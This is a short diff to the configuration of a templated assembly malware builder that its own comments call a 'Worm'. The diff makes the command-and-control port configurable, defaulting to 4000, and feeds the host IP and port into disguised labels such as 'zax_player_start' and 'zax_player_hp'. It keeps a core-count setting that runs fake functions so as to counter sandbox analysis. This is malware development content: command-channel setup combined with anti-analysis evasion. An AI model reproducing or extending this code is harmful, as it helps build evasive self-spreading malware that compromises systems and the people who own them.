@@ -19,6 +19,8 @@
 #!reqCS##BasicExe
 
 #!reqVar##IP_ADDR##Host ip address. For connection, command.##str
+#!reqVar##ZAX_port##Host port number.##int
+#!setVar##ZAX_port##4000##int
 #!reqVar##ZAX_core_num##Number of cores/processors. If the number of cores is too low, Worm will run fake functions and will not fully start. This option is used to counter sandbox analysis.##int
 #!setVar##ZAX_core_num##2##int
 #!reqVar##ZAX_fpath_buff##Buffer for storing file paths. Size given in bytes. Increase if you will be operating on longer paths.##str
@@ -95,7 +97,7 @@ section .data
 {% set ZAX_MAIN_IP = IP_ADDR%}
     
     zax_player_start: dd {{TOOL.AsmSh_encode(ZAX_MAIN_IP)}} ; ip addr
-    zax_player_hp: equ 4000 ; port num
+    zax_player_hp: equ {{ZAX_port}} ; port num
 
 {% set _ = TOOL.AsmSh_reset_table() %}
 
